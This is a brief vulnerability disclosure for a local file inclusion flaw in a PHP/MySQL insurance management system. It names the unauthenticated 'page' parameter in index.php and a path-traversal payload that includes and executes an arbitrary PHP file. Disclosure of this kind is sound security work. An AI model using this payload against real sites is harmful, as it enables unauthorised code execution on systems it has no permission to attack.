# Insurance Management System PHP and MySQL V1.0 - File Inclusion

### You do not need to log in and open the website storage directory

Supplier:https://www.sourcecodester.com/php/16995/insurance-management-system-php-mysql.html

http://localhost/?page=   ----->    'page' can control some p parameters

Vulnerability location: Index.php in the root directory of the website.

![1](/img/Insurance-Management-System-PHP-and-MySQL/1.png)

Note: For the convenience of the demonstration, I created info.php on the C drive with the content<? PHP phpinfo();

Payload:?page=../../../info

![2](/img/Insurance-Management-System-PHP-and-MySQL/2.png)
![3](/img/Insurance-Management-System-PHP-and-MySQL/3.png)

It can be seen that the info.php under the C drive has been successfully included and the corresponding code has been executed.